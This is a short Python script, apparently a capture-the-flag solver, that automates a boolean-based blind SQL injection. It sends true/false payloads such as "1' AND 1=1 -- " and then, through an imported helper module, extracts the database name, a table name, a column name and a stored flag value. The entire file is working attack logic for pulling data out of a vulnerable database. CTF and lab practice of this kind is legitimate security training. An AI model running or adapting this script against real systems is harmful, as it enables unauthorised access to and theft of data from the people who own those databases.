import blind_based

def try_blind_based():
    print("\n=== Falling back to Boolean-based Blind SQLi ===")
    true_res = blind_based.send("1' AND 1=1 -- ")
    false_res = blind_based.send("1' AND 1=2 -- ")
    if true_res == false_res:
        print("[!] Boolean-based not reliable. Switching to Time-based SQLi.")
        return False
    
    length = blind_based.get_database_length()
    if length is None:
        print("[-] Couldn't find db_name_length")
        return False
    
    db_name = blind_based.extract_database_name(length)
    if db_name is None:
        print("[-] Couldn't find db_name")
        return False
        
    table_name = blind_based.extract_table_name(db_name = db_name)
    if table_name is None:
        print("[-] Couldn't find table")
        return False

    col1 = blind_based.extract_column_name_by_offset(offset=0, table_name=table_name)
    if col1 is None:
        print("[-] Couldn't find column")
        return False

    # col2 = extract_column_name_by_offset(offset=1)
    # col_to_use = col1 if "flag" in col1 else col2
    flag = blind_based.extract_flag_value(col_name=col1, table_name=table_name)
    if flag is None:
        print("[-] Couldn't find flag")
        return False

    print(f"\n🎯 flag: {flag}")
    return True
